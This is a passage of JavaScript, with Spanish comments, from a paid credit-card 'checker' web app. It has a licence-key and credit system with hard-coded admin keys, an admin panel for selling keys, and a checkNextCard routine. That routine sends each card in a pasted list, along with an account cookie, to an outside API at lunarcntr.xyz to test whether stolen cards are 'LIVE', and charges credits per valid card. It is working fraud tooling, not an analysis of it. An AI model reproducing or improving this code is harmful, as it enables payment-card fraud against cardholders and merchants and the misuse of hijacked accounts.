    function validateKeyAlgorithm(key) {
      const k = key.trim().toUpperCase();

      // Keys fijas de administrador (mantienen un formato conocido para ti)
      if (k === 'ADMIN2025' || k === 'SUPERADMIN') {
        // Asignamos una duración alta (como 365 días) y nivel admin
        return { duration: 365, type: "Admin", level: "admin", keyId: k, isCustom: false, creditsAssigned: 999999 };
      }

      // Validar formato de la key de créditos: ZHENTIO-XXXX-XXXX-XXXX-XXXX-XXXX-CHECKSUM
      const parts = k.split('-');
      // Esperamos 7 partes: ZHENTIO, 5 bloques de 4 caracteres, y 1 checksum de 4 caracteres
      if (parts.length !== 7 || parts[0] !== 'ZHENTIO') { 
          return null; // Formato incorrecto
      }

      // Verificar que los bloques intermedios tengan 4 caracteres alfanuméricos
      for (let i = 1; i <= 5; i++) { 
          if (!/^[A-Z0-9]{4}$/.test(parts[i])) { 
              return null; // Bloque no alfanumérico o longitud incorrecta
          }
      }

      // Extraer checksum y la parte de la key sin checksum
      const submittedChecksum = parts[6]; // El último bloque es el checksum
      const keyWithoutChecksum = parts.slice(0, 6).join('-'); // Unimos todo excepto el checksum
      
      // Recalcular el checksum esperado
      const expectedChecksum = simpleHash(keyWithoutChecksum).substring(0, 4).toUpperCase(); 

      // Si los checksum no coinciden, la key es inválida
      if (submittedChecksum !== expectedChecksum) { 
          toastr.error("Key inválida: Error de integridad."); // Mensaje más genérico para el usuario
          return null;
      }

      // Ahora, buscar en tus keys personalizadas (almacenadas localmente)
      const customKey = getCustomKeys()[k]; 
      
      if (customKey) { 
        // Validar la key personalizada
        const now = new Date().getTime(); 
        if (customKey.expiryDate && new Date(customKey.expiryDate).getTime() < now) { 
            toastr.error("Esta key ha expirado."); 
            return null;
        }
        
        // **IMPORTANTE**: Ahora la validación principal para usar la key es si tiene créditos
        if (customKey.creditsAssigned <= 0) {
            toastr.error("Esta key se ha quedado sin créditos.");
            return null;
        }
        
        // La validación de currentUses vs maxUses sigue para limitar activaciones concurrentes/múltiples usuarios si se desea
        // pero NO debe bloquear el acceso si ya se activó y tiene créditos
        // if (customKey.currentUses >= customKey.maxUses) { 
        //     toastr.error("Esta key ha alcanzado su límite de activaciones."); 
        //     return null;
        // }
        
        // Asignar tipo y nivel basados en los créditos asignados
        let level = "personalizada"; 
        let type = `${customKey.creditsAssigned} Créditos`; 

        if (customKey.creditsAssigned === 100) { level = "basico"; } 
        else if (customKey.creditsAssigned === 200) { level = "bronce"; } 
        else if (customKey.creditsAssigned === 300) { level = "plata"; } 
        else if (customKey.creditsAssigned === 500) { level = "oro"; } 
        else if (customKey.creditsAssigned > 500) { level = "vip"; } 
        
        return { 
            duration: customKey.creditsAssigned, // Usamos la duración como los créditos para la sesión
            type: type, // Descripción que se muestra al usuario
            level: level, // Nivel de acceso
            keyId: k, 
            isCustom: true, 
            creditsAssigned: customKey.creditsAssigned // Pasamos los créditos asignados
        };
      }
      
      // Si la key no es reconocida ni por el formato aleatorio ni por las fijas
      return null;
    }

    // Sistema de gestión de keys personalizadas
    function getCustomKeys() {
      const keys = localStorage.getItem('customKeys');
      return keys ? JSON.parse(keys) : {};
    }

    function saveCustomKeys(keys) {
      localStorage.setItem('customKeys', JSON.stringify(keys));
    }

    function markKeyAsUsed(keyCode, typeOfUse = 'activation') {
      const customKeys = getCustomKeys();
      if (customKeys[keyCode] && customKeys[keyCode].isCustom !== false) { // Asegurarse de que no sea una key de sistema fija
        if (typeOfUse === 'activation') {
            // Solo incrementa currentUses si es menor que maxUses
            if (customKeys[keyCode].currentUses < customKeys[keyCode].maxUses) {
                customKeys[keyCode].currentUses++; 
            } else {
                console.warn(`Key ${keyCode} ya alcanzó el máximo de activaciones.`);
                // No retornar, permitir el uso si tiene créditos, pero no incrementar más el contador
            }
        }
        // Lógica para decrementar créditos por uso de checker (ya implementada en checkNextCard)
        customKeys[keyCode].lastUsed = new Date().toISOString();
        saveCustomKeys(customKeys);
        updateAdminStats(); // Actualizar estadísticas del admin
      }
    }

    // Variables de autenticación con protección adicional
    let authenticated = false;
    let userSession = null;
    let sessionChecksum = null;
    let lastServerCheck = 0;
    let isAdmin = false;

    let tarjetas = []; // Array que contendrá las tarjetas a chequear
    let cookies = "";
    let paused = false;
    let checking = false; // Variable para controlar si el chequeo está en curso

    // Variables para los contadores
    let livesCount = 0;
    let diesCount = 0;
    let errorsCount = 0;
    let testedCount = 0;
    let totalCards = 0; // Para almacenar el total inicial de tarjetas

    // Sonido para live
    const audioLive = new Audio('https://actions.google.com/sounds/v1/cartoon/clang_and_wobble.ogg'); 

    // Función para verificar si la sesión es válida (con validaciones adicionales)
    async function isSessionValid() {
      const session = localStorage.getItem('userSession');
      const storedChecksum = localStorage.getItem('sessionChecksum');
      
      if (!session || !storedChecksum) return false;
      
      try {
        const sessionData = JSON.parse(session);
        
        // Verificar integridad de la sesión
        const expectedChecksum = simpleHash(JSON.stringify(sessionData));
        if (storedChecksum !== expectedChecksum) {
          console.warn('Sesión corrupta detectada');
          return false;
        }
        
        // Obtener tiempo real del servidor para evitar manipulación de hora local
        const serverTime = await getServerTimestamp();
        
        // Si es una key personalizada, verificar si ya no tiene créditos
        if (sessionData.isCustom) {
            // Re-obtener los datos actuales de la key desde localStorage para verificar créditos actualizados
            const currentKeyData = getCustomKeys()[sessionData.keyId];
            if (!currentKeyData || currentKeyData.creditsAssigned <= 0) {
                toastr.error("⚠️ Tu key se ha quedado sin créditos.");
                return false;
            }
            // También verificar el límite de activaciones
            if (currentKeyData.currentUses >= currentKeyData.maxUses) {
                toastr.error("⚠️ La key usada ha alcanzado su límite de activaciones.");
                return false;
            }
            // Actualizar los créditos en la sesión activa si han cambiado
            if (sessionData.creditsAssigned !== currentKeyData.creditsAssigned) {
                userSession.creditsAssigned = currentKeyData.creditsAssigned;
                // Opcional: volver a guardar la sesión si se actualiza para mantener el checksum consistente
                // localStorage.setItem('userSession', JSON.stringify(userSession));
                // localStorage.setItem('sessionChecksum', simpleHash(JSON.stringify(userSession)));
            }
        }
        
        // Verificar que la sesión no sea demasiado antigua (máximo 31 días)
        if (serverTime - sessionData.createdAt > (31 * 24 * 60 * 60 * 1000)) {
          return false;
        }
        
        // Verificación adicional: comprobar con servidor cada 5 minutos
        if (serverTime - lastServerCheck > 300000) { // 5 minutos
          lastServerCheck = serverTime;
          return await validateSessionWithServer(sessionData);
        }
        
        return true;
      } catch (error) {
        console.error('Error validando sesión:', error);
        return false;
      }
    }

    // Función para validar sesión con servidor externo (anti-manipulación)
    async function validateSessionWithServer(sessionData) {
      try {
        // Simular validación con servidor (en un caso real sería tu API)
        const response = await fetch(API_ENDPOINT + '/1', {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'X-Session-Token': simpleHash(sessionData.keyUsed + sessionData.createdAt)
          }
        });
        
        // Si el servidor responde, consideramos la sesión válida
        return response.ok;
      } catch (error) {
        // Si no hay conexión, permitir uso offline por tiempo limitado
        return true;
      }
    }

    // Función para crear sesión con protecciones adicionales
    async function createSession(keyData, originalKey) {
      const serverTime = await getServerTimestamp();
      
      const sessionData = {
        createdAt: serverTime,
        keyType: keyData.type,
        level: keyData.level,
        creditsAssigned: keyData.creditsAssigned, // Almacenar créditos en la sesión
        keyUsed: simpleHash(originalKey), // Hash de la key original (no la key real)
        keyId: keyData.keyId, // ID de la key si es personalizada
        isCustom: keyData.isCustom, // Para saber si es una key custom
        sessionId: simpleHash(originalKey + serverTime), // ID único de sesión
        integrity: simpleHash(serverTime + keyData.creditsAssigned + originalKey)
      };
      
      // Guardar sesión con checksum para detectar manipulación
      const sessionChecksum = simpleHash(JSON.stringify(sessionData));
      
      localStorage.setItem('userSession', JSON.stringify(sessionData));
      localStorage.setItem('sessionChecksum', sessionChecksum);
      
      userSession = sessionData;
      lastServerCheck = serverTime;
      
      return sessionData;
    }

    // Función para mostrar/ocultar pantallas
    function showLoginScreen() {
      $("#loginScreen").addClass("show").show();
      $("#mainApp").hide();
      $("#adminPanel").hide();
      isAdmin = false;
    }

    function showMainApp() {
      $("#loginScreen").removeClass("show").hide();
      $("#mainApp").show();
      $("#adminPanel").hide();
      isAdmin = false;
    }

    function showAdminPanel() {
      $("#loginScreen").removeClass("show").hide();
      $("#mainApp").hide();
      $("#adminPanel").addClass("show").show();
      isAdmin = true;
      loadAdminPanel();
      
      // Animar entrada de elementos
      setTimeout(() => {
        $(".admin-container").css({
          opacity: 0,
          transform: "translateY(30px)"
        }).animate({
          opacity: 1,
          transform: "translateY(0)"
        }, 600);
      }, 100);
    }

    // Función para manejar el login con validaciones mejoradas
    async function handleLogin() {
      const keyInput = $("#keyInput").val().trim();
      
      if (!keyInput) {
        toastr.error("Por favor, ingresa una key válida.");
        return;
      }

      // Mostrar indicador de carga
      $("#loginBtn").prop("disabled", true).html('<i class="fas fa-spinner fa-spin"></i> Validando...');

      try {
        const keyData = validateKeyAlgorithm(keyInput); // Usar el nuevo validador
        
        if (!keyData) {
          toastr.error("Key inválida o no reconocida. Contacta al administrador para obtener una key válida.");
          return;
        }

        // Validar con servidor (simulado)
        const serverValidation = await validateKeyWithServer(keyInput, keyData);
        if (!serverValidation) {
          toastr.error("Error de servidor al validar key. Intenta más tarde.");
          return;
        }

        const session = await createSession(keyData, keyInput);
        authenticated = true;
        
        // Marcar key como usada (incrementar activación) si es personalizada
        if (keyData.isCustom) {
            markKeyAsUsed(keyData.keyId, 'activation'); // Marcar como activada
        }
        
        // Verificar si es admin
        if (keyData.level === 'admin') {
          toastr.success("¡Acceso de administrador concedido!", "Bienvenido Admin");
          $("#keyInput").val("");
          showAdminPanel();
        } else {
          toastr.success(`¡Acceso concedido! Key de ${session.creditsAssigned} créditos.`, "Bienvenido"); // Muestra los créditos
          $("#keyInput").val("");
          
          // Actualizar información de sesión
          await updateSessionInfo();
          showMainApp();
        }
        
        // Iniciar verificaciones periódicas de sesión
        startSessionMonitoring();
        
      } catch (error) {
        console.error('Error durante el login:', error);
        toastr.error("Error al validar la key. Intenta nuevamente.");
      } finally {
        $("#loginBtn").prop("disabled", false).html('<i class="fas fa-key"></i> Acceder');
      }
    }

    // Función para validar key con servidor (prevenir reutilización)
    async function validateKeyWithServer(key, keyData) {
      try {
        // En un caso real, esto sería una llamada a tu API
        const response = await fetch(API_ENDPOINT, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            keyHash: simpleHash(key),
            level: keyData.level,
            creditsAssigned: keyData.creditsAssigned, // Enviar créditos
            timestamp: await getServerTimestamp()
          })
        });
        
        // Simular validación (en producción verificarías la respuesta real)
        return response.ok;
      } catch (error) {
        // Si no hay conexión, permitir solo keys que no dependan de validación de usos
        return keyData.isCustom === false; // Permitir solo keys fijas de admin si no hay conexión
      }
    }

    // Función para actualizar información de sesión con validaciones
    async function updateSessionInfo() {
      if (!userSession) return;
      
      try {
        let sessionText = `
          <span>
            <i class="fas fa-shield-alt"></i> Sesión activa - 
        `;

        if (userSession.level === 'admin') {
            sessionText += `ADMINISTRADOR`; // Para la key de admin, solo muestra "ADMINISTRADOR"
        } else {
            sessionText += `${userSession.creditsAssigned} CRÉDITOS`; // Muestra los créditos disponibles
        }
        
        sessionText += `</span> <button id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Cerrar Sesión</button>`;

        $("#sessionInfo").html(sessionText);
        
      } catch (error) {
        console.error('Error actualizando información de sesión:', error);
      }
    }

    // Función para monitoreo continuo de sesión
    function startSessionMonitoring() {
      // Verificar cada 30 segundos si la sesión sigue siendo válida
      const monitoringInterval = setInterval(async () => {
        if (!authenticated) {
          clearInterval(monitoringInterval);
          return;
        }
        
        const isValid = await isSessionValid();
        if (!isValid) {
          clearInterval(monitoringInterval);
          toastr.error("⚠️ Sesión expirada o manipulada. Redirigiendo al login...");
          logout();
        }
      }, 30000); // Cada 30 segundos
      
      // Verificar integridad del localStorage cada 10 segundos
      const integrityCheck = setInterval(() => {
        if (!authenticated) {
          clearInterval(integrityCheck);
          return;
        }
        
        const session = localStorage.getItem('userSession');
        const checksum = localStorage.getItem('sessionChecksum');
        
        if (!session || !checksum) {
          clearInterval(integrityCheck);
          toastr.error("⚠️ Datos de sesión eliminados. Redirigiendo al login...");
          logout();
          return;
        }
        
        try {
          const sessionData = JSON.parse(session);
          const expectedChecksum = simpleHash(JSON.stringify(sessionData));
          
          if (checksum !== expectedChecksum) {
            clearInterval(integrityCheck);
            toastr.error("⚠️ Manipulación de datos detectada. Redirigiendo al login...");
            logout();
          }
        } catch (error) {
          clearInterval(integrityCheck);
          toastr.error("⚠️ Error en los datos de sesión. Redirigiendo al login...");
          logout();
        }
      }, 10000); // Cada 10 segundos
    }

    // Función para cerrar sesión con limpieza completa
    function logout() {
      localStorage.removeItem('userSession');
      localStorage.removeItem('sessionChecksum');
      authenticated = false;
      userSession = null;
      sessionChecksum = null;
      lastServerCheck = 0;
      isAdmin = false;
      stopChecker();
      toastr.info("Sesión cerrada correctamente.");
      showLoginScreen();
    }

    // Funciones del Panel de Administración
    function loadAdminPanel() {
      updateKeysTable();
      updateAdminStats();
    }

    function generateRandomKey() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        const generateBlock = (length) => {
            let result = '';
            for (let i = 0; i < length; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        };

        const block1 = generateBlock(4); 
        const block2 = generateBlock(4); 
        const block3 = generateBlock(4); 
        const block4 = generateBlock(4); 
        const block5 = generateBlock(4); 
        
        // Unificar para calcular el checksum
        const partialKey = `ZHENTIO-${block1}-${block2}-${block3}-${block4}-${block5}`; 
        const checksum = simpleHash(partialKey).substring(0, 4).toUpperCase(); 

        const fullKey = `${partialKey}-${checksum}`;
        $("#newKeyCode").val(fullKey); 
    }


    async function addNewKey() { 
        const keyCode = $("#newKeyCode").val().trim().toUpperCase();
        const creditsAssigned = parseInt($("#creditsAssigned").val()); 
        const maxUses = parseInt($("#keyMaxUses").val()) || 99999; // Default to a very high number for credits keys
        const expiryDateInput = $("#keyExpiryDate").val(); 
        let expiryDate = null;

        if (expiryDateInput) {
            expiryDate = new Date(expiryDateInput).getTime(); 
        }
        
        if (!keyCode) {
            toastr.error("Por favor, ingresa un código de key.");
            return;
        }

        // Validación del formato de la key generada (regex para ZHENTIO-XXXX-XXXX-XXXX-XXXX-XXXX-CHECKSUM)
        const keyRegex = /^ZHENTIO-([A-Z0-9]{4}-){5}[A-Z0-9]{4}$/; 
        if (!keyRegex.test(keyCode)) {
            toastr.error("El formato de la key no es válido. Usa el generador de keys aleatorias.");
            return;
        }

        if (isNaN(creditsAssigned) || creditsAssigned < 1) {
            toastr.error("Ingresa una cantidad de créditos válida (mínimo 1).");
            return;
        }
        
        // Determinar el 'tipo' y 'nivel' basado en los créditos asignados para visualización interna
        let keyType = `${creditsAssigned} Créditos`; 
        let keyLevel = "personalizada"; 

        if (creditsAssigned === 100) { keyType = "Key 100 Créditos"; keyLevel = "basico"; }
        else if (creditsAssigned === 200) { keyType = "Key 200 Créditos"; keyLevel = "bronce"; }
        else if (creditsAssigned === 300) { keyType = "Key 300 Créditos"; keyLevel = "plata"; }
        else if (creditsAssigned === 500) { keyType = "Key 500 Créditos"; keyLevel = "oro"; }
        else if (creditsAssigned > 500) { keyType = `Key ${creditsAssigned} Créditos`; keyLevel = "vip"; } 

        const customKeys = getCustomKeys();
        if (customKeys[keyCode]) {
            toastr.error("Esta key ya existe en el sistema.");
            return;
        }

        // Calcula el checksum de control de la key ingresada
        const parts = keyCode.split('-');
        const submittedChecksum = parts.pop(); 
        const keyWithoutChecksum = parts.join('-'); 
        const expectedChecksum = simpleHash(keyWithoutChecksum).substring(0, 4).toUpperCase();

        if (submittedChecksum !== expectedChecksum) {
            toastr.error("Key inválida: Checksum no coincide. Key manipulada o generada incorrectamente.");
            return;
        }

        const newKey = {
            code: keyCode,
            creditsAssigned: creditsAssigned, 
            creditsUsed: 0, 
            description: $("#customDescription").val().trim() || `${creditsAssigned} créditos`, 
            type: keyType, 
            level: keyLevel, 
            maxUses: maxUses,
            currentUses: 0, 
            createdAt: (await getServerTimestamp()), 
            expiryDate: expiryDate,
            lastUsed: null,
            status: 'active',
            isCustom: true 
        };

        customKeys[keyCode] = newKey;
        saveCustomKeys(customKeys);

        // Limpiar formulario
        $("#newKeyCode").val("");
        $("#creditsAssigned").val("100"); 
        $("#customDescription").val("");
        $("#keyMaxUses").val("99999"); // Reset to default high value
        $("#keyExpiryDate").val("");
        
        updateKeysTable();
        updateAdminStats();
        
        toastr.success(`Key "${keyCode}" creada exitosamente con ${creditsAssigned} créditos.`);
    }

    function updateKeysTable() {
      const customKeys = getCustomKeys();
      const tbody = $("#keysTableBody");
      tbody.empty();
      
      // Keys fijas de administrador (no se pueden eliminar ni modificar desde el panel)
      const fixedAdminKeys = [
        { code: 'ADMIN2025', type: 'Admin', level: 'admin', creditsAssigned: 999999, isCustom: false },
        { code: 'SUPERADMIN', type: 'Admin', level: 'admin', creditsAssigned: 999999, isCustom: false }
      ];
      
      fixedAdminKeys.forEach(key => {
        const statusClass = 'status-active'; 
        const levelBadge = '👑';
        tbody.append(`
          <tr style="animation: fadeInUp 0.3s ease-out;">
            <td><strong>${key.code}</strong></td>
            <td>${levelBadge} ${key.type}</td>
            <td>${key.creditsAssigned === 999999 ? '∞' : key.creditsAssigned}</td>
            <td><span style="color: #10b981;">∞</span></td>
            <td><span class="key-status ${statusClass}">Sistema</span></td>
            <td><i class="fas fa-cog"></i> Sistema</td>
            <td>N/A</td>
            <td><em style="color: #67e8f9;"><i class="fas fa-shield-alt"></i> Protegida</em></td>
          </tr>
        `);
      });
      
      // Agregar keys personalizadas (generadas por el admin)
      Object.entries(customKeys).forEach(([code, key]) => {
        const now = new Date().getTime();
        const isExpired = key.expiryDate && key.expiryDate < now;
        const isMaxUsed = key.currentUses >= key.maxUses;
        const outOfCredits = key.creditsAssigned <= 0;
        
        let status = 'active';
        let statusClass = 'status-active';
        
        if (isExpired) {
          status = 'expirada'; 
          statusClass = 'status-expired';
        } else if (outOfCredits) { // Prioriza sin créditos sobre agotada por usos si se desea
          status = 'sin créditos';
          statusClass = 'status-inactive';
        } else if (isMaxUsed) { 
          status = 'agotada'; 
          statusClass = 'status-inactive';
        }
        
        const createdDate = new Date(key.createdAt).toLocaleDateString();
        const expiryDate = key.expiryDate ? new Date(key.expiryDate).toLocaleDateString() : 'N/A';
        
        let levelIcon;
        switch(key.level) {
            case 'admin': levelIcon = '👑'; break;
            case 'vip': levelIcon = '💎'; break;
            case 'oro': levelIcon = '🏆'; break; 
            case 'plata': levelIcon = '🥈'; break; 
            case 'bronce': levelIcon = '🥉'; break; 
            case 'basico': levelIcon = '🔰'; break;
            default: levelIcon = '🔧'; 
        }
        
        tbody.append(`
          <tr style="animation: slideInLeft 0.4s ease-out;">
            <td><strong>${code}</strong></td>
            <td>${levelIcon} ${key.description}</td>
            <td>${key.creditsAssigned}</td>
            <td>
              <span style="color: ${isMaxUsed ? '#ef4444' : '#10b981'};">
                ${key.currentUses}
              </span>
              <span style="color: #67e8f9;">/${key.maxUses === 99999 ? '∞' : key.maxUses}</span>
            </td>
            <td><span class="key-status ${statusClass}">${status}</span></td>
            <td><i class="fas fa-calendar"></i> ${createdDate}</td>
            <td>${expiryDate}</td>
            <td>
              <button class="btn-admin btn-small btn-warning" onclick="editKey('${code}')" title="Editar">
                <i class="fas fa-edit"></i>
              </button>
              <button class="btn-admin btn-small btn-danger" onclick="deleteKey('${code}')" title="Eliminar">
                <i class="fas fa-trash"></i>
              </button>
              <button class="btn-admin btn-small btn-primary" onclick="resetKeyUses('${code}')" title="Resetear activaciones">
                <i class="fas fa-redo"></i>
              </button>
            </td>
          </tr>
        `);
      });
    }

    function updateAdminStats() {
      const customKeys = getCustomKeys();
      const now = new Date().getTime();
      
      let totalKeys = Object.keys(customKeys).length + 2; 
      let activeKeys = 2; // Admin keys are always active
      let usedKeys = 0; // Represents keys whose maxUses has been met or out of credits
      let expiredKeys = 0;
      
      Object.values(customKeys).forEach(key => {
        const isExpired = key.expiryDate && key.expiryDate < now;
        const isMaxUsed = key.currentUses >= key.maxUses;
        const outOfCredits = key.creditsAssigned <= 0;
        
        if (isExpired) {
          expiredKeys++;
        } 
        // A key is considered 'used' or 'exhausted' if it's out of credits or hit max activations
        else if (outOfCredits || isMaxUsed) { 
          usedKeys++;
        } else {
          activeKeys++;
        }
      });
      
      $("#totalKeysCount").text(totalKeys);
      $("#activeKeysCount").text(activeKeys);
      $("#usedKeysCount").text(usedKeys);
      $("#expiredKeysCount").text(expiredKeys);
    }

    function deleteKey(keyCode) {
      // Prevenir eliminación de keys fijas de sistema
      if (['ADMIN2025', 'SUPERADMIN'].includes(keyCode)) {
        toastr.error("No puedes eliminar una key de sistema.");
        return;
      }

      if (confirm(`¿Estás seguro de eliminar la key "${keyCode}"?`)) {
        const customKeys = getCustomKeys();
        delete customKeys[keyCode];
        saveCustomKeys(customKeys);
        
        updateKeysTable();
        updateAdminStats();
        
        toastr.success(`Key "${keyCode}" eliminada exitosamente.`);
      }
    }

    function resetKeyUses(keyCode) {
        // Prevenir reseteo de keys fijas de sistema
        if (['ADMIN2025', 'SUPERADMIN'].includes(keyCode)) {
            toastr.error("No puedes resetear una key de sistema.");
            return;
        }

        if (confirm(`¿Resetear las activaciones de la key "${keyCode}" a 0?`)) {
            const customKeys = getCustomKeys();
            if (customKeys[keyCode]) {
                customKeys[keyCode].currentUses = 0;
                // Optional: customKeys[keyCode].creditsAssigned = original_credits_value; // if you want to also reset credits
                customKeys[keyCode].lastUsed = null;
                saveCustomKeys(customKeys);
                
                updateKeysTable();
                updateAdminStats();
                
                toastr.success(`Activaciones de "${keyCode}" reseteadas.`);
            }
        }
    }

    function editKey(keyCode) {
      // Prevenir edición de keys fijas de sistema
      if (['ADMIN2025', 'SUPERADMIN'].includes(keyCode)) {
        toastr.error("No puedes editar una key de sistema.");
        return;
      }

      const customKeys = getCustomKeys();
      const key = customKeys[keyCode];
      
      if (!key) return;
      
      const newCredits = prompt(`Nuevo valor de créditos para "${keyCode}" (actual: ${key.creditsAssigned}):`, key.creditsAssigned);
      if (newCredits !== null && !isNaN(newCredits) && parseInt(newCredits) >= 0) { // Allow 0 credits for setting to exhausted
          key.creditsAssigned = parseInt(newCredits);
          // Actualizar la descripción basada en los nuevos créditos si no hay una personalizada
          if (!key.description || key.description.includes('créditos')) {
             key.description = `${key.creditsAssigned} Créditos`;
          }
          // Actualizar el tipo y nivel en base a los nuevos créditos
          if (key.creditsAssigned === 100) { key.type = "Key 100 Créditos"; key.level = "basico"; }
          else if (key.creditsAssigned === 200) { key.type = "Key 200 Créditos"; key.level = "bronce"; }
          else if (key.creditsAssigned === 300) { key.type = "Key 300 Créditos"; key.level = "plata"; }
          else if (key.creditsAssigned === 500) { key.type = "Key 500 Créditos"; key.level = "oro"; }
          else if (key.creditsAssigned > 500) { key.type = `Key ${key.creditsAssigned} Créditos`; key.level = "vip"; }
          else { key.type = `${key.creditsAssigned} Créditos`; key.level = "personalizada"; }


          const newMaxUses = prompt(`Nuevo máximo de activaciones para "${keyCode}" (actual: ${key.maxUses === 99999 ? '∞' : key.maxUses}):`, key.maxUses); // Display infinity for 99999
          if (newMaxUses !== null && !isNaN(newMaxUses) && parseInt(newMaxUses) > 0) {
              key.maxUses = parseInt(newMaxUses);
          } else {
              toastr.info("Máximo de activaciones no modificado o inválido.");
          }

          saveCustomKeys(customKeys);
          
          updateKeysTable();
          updateAdminStats();
          
          toastr.success(`Key "${keyCode}" actualizada.`);
      } else {
          toastr.info("Créditos no modificados o valor inválido.");
      }
    }


    function exportKeys() {
      const customKeys = getCustomKeys();
      const dataStr = JSON.stringify(customKeys, null, 2);
      const dataBlob = new Blob([dataStr], {type: 'application/json'});
      
      const link = document.createElement('a');
      link.href = URL.createObjectURL(dataBlob);
      link.download = `keys_backup_${new Date().toISOString().split('T')[0]}.json`;
      link.click();
      
      toastr.success("Keys exportadas exitosamente.");
    }

    function clearAllKeys() {
      if (confirm("⚠️ ¿Estás seguro de eliminar TODAS las keys personalizadas? Esta acción no se puede deshacer.")) {
        if (confirm("⚠️ CONFIRMACIÓN FINAL: Esto eliminará todas las keys personalizadas permanentemente.")) {
          localStorage.removeItem('customKeys');
          updateKeysTable();
          updateAdminStats();
          toastr.warning("Todas las keys personalizadas han sido eliminadas.");
        }
      }
    }

    // Función para verificar sesión al cargar con validaciones mejoradas
    async function checkSession() {
      try {
        const isValid = await isSessionValid();
        if (isValid) {
          const session = localStorage.getItem('userSession');
          userSession = JSON.parse(session);
          authenticated = true;
          
          // Verificar si es admin
          if (userSession.level === 'admin') {
            showAdminPanel();
          } else {
            await updateSessionInfo();
            showMainApp();
          }
          
          startSessionMonitoring(); // Iniciar monitoreo
        } else {
          localStorage.removeItem('userSession');
          localStorage.removeItem('sessionChecksum');
          showLoginScreen();
        }
      } catch (error) {
        console.error('Error verificando sesión:', error);
        showLoginScreen();
      }
    }

    // Protección adicional: detectar manipulación de DevTools
    let devToolsOpen = false;
    setInterval(() => {
      const threshold = 160;
      if (window.outerHeight - window.innerHeight > threshold || 
          window.outerWidth - window.innerWidth > threshold) {
        if (!devToolsOpen && authenticated) {
          devToolsOpen = true;
          console.warn('⚠️ Herramientas de desarrollador detectadas');
          // Opcional: cerrar sesión si se detectan DevTools
          // logout();
        }
      } else {
        devToolsOpen = false;
      }
    }, 1000);

    // Protección contra manipulación de código
    Object.freeze(simpleHash); // Freeze el simpleHash también
    Object.freeze(validateKeyAlgorithm);
    Object.freeze(isSessionValid);
    Object.freeze(createSession); 
    Object.freeze(markKeyAsUsed); // Freeze markKeyAsUsed

    // Función para actualizar los contadores en la interfaz
    function updateCountsDisplay() {
      $(".val-lives").text(livesCount);
      $(".val-dies").text(diesCount);
      $(".val-errors").text(errorsCount);
      $(".val-tested").text(testedCount);
      $(".val-total").text(totalCards);
    }

    // Función para resetear todos los contadores
    function resetContadores() {
      livesCount = 0;
      diesCount = 0;
      errorsCount = 0;
      testedCount = 0;
      totalCards = 0; // Se restablece al limpiar
      $("#lives, #dies, #errors").empty(); // Limpia los contenedores de resultados
      updateCountsDisplay(); // Actualiza la interfaz con los contadores a cero
    }

    // Función para actualizar el estado del checador
    function updateStatus(text) {
      $("#estatus").text(text);
    }

    // Función para habilitar/deshabilitar botones de control
    function enableControls(startEnabled, pauseEnabled, stopEnabled) {
      $("#chk-start").prop("disabled", !startEnabled);
      $("#chk-pause").prop("disabled", !pauseEnabled);
      $("#chk-stop").prop("disabled", !stopEnabled);
    }

    // Función para limpiar y traducir el texto de la API
    function cleanResponseText(rawHtml) {
        let cleanText = rawHtml.replace(/<.*?>/g, '').trim().toLowerCase(); // Eliminar HTML y a minúsculas
        const traducciones = {
            "conta sem endereço ou suspensa": "cuenta sin direccion o suspendida",
            "reprovada": "rechazada",
            "aprovada": "aprobada",
            "recusado": "rechazada",
            "cartão autorizado": "tarjeta autorizada",
            "autorizado": "aprobada" // Añadido para consistencia
        };
        for (const original in traducciones) {
            cleanText = cleanText.replace(original, traducciones[original]);
        }
        return cleanText;
    }

    // Función para actualizar el textarea de la lista de tarjetas
    function updateCardListDisplay() {
        $("#lista_cartoes").val(tarjetas.join("\n"));
    }

    // Función principal para chequear la siguiente tarjeta
    async function checkNextCard() {
      // Si está pausado o el chequeo se ha detenido, salimos de la función.
      if (paused || !checking) {
        return;
      }

      // Si ya no quedan tarjetas en el array, finalizamos el chequeo.
      if (tarjetas.length === 0) {
        updateStatus("Finalizado.");
        enableControls(true, false, false);
        checking = false; // El chequeo ha terminado
        return;
      }

      // 1. Antes de chequear, verificar si hay créditos disponibles (para no-admins)
      // Solo verifica si va a consumir créditos. Si es admin, no hay consumo.
      if (userSession && userSession.level !== 'admin' && userSession.creditsAssigned < 2) { 
          toastr.error("⚠️ No tienes suficientes créditos para continuar el chequeo. Necesitas 2 créditos por LIVE.");
          stopChecker(); // Detiene el chequeo
          return;
      }

      const card = tarjetas[0]; // Tomamos la primera tarjeta del array
      
      // Actualizamos los contadores ANTES de hacer la petición
      testedCount++;
      updateStatus(`Chequeando: ${card} (${testedCount}/${totalCards})`);
      updateCountsDisplay();

      try {
        const response = await fetch('https://lunarcntr.xyz/nopsetted2/checkers/free/audible/api.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
          body: new URLSearchParams({ lista: card, cookie: cookies })
        });

        // Si la respuesta de la red no es exitosa, lanzamos un error
        if (!response.ok) throw new Error('Error en la respuesta de la API');

        const raw_text = await response.text();
        // Procesamos el texto de la API para una interpretación consistente
        const processed_text = cleanResponseText(raw_text); 

        // Verificamos si la cookie ha expirado o la cuenta está suspendida
        if (/(cookie expirada|invalid cookie|session expired|cookie inválida|login required|please login|autenticaci[oó]n requerida)/i.test(processed_text)
            || processed_text.includes("cuenta sin direccion o suspendida")) { 
          toastr.error("⚠️ Tu cookie ha expirado o la cuenta está suspendida. Actualízala.");
          stopChecker(); // Detiene el proceso de chequeo
          return; // Sale de la función para no procesar más tarjetas
        }

        let estado = "ERROR ⚠️";

        // Determinamos el estado de la tarjeta basándonos en la respuesta procesada
        if (processed_text.includes("aprobada") || processed_text.includes("tarjeta autorizada")) {
          estado = "LIVE ✅";
          $("#lives").append(card + " => " + estado + "\n");
          livesCount++;
          audioLive.play(); // Reproduce sonido para las lives

          // DESCONTAR CRÉDITOS por LIVE, SOLO SI NO ES ADMIN
          if (userSession && userSession.level !== 'admin') {
              userSession.creditsAssigned -= 2; // Descuenta 2 créditos
              if (userSession.creditsAssigned < 0) userSession.creditsAssigned = 0; // Asegurarse que no sea negativo

              // Actualizar la key en localStorage para persistencia
              const customKeys = getCustomKeys();
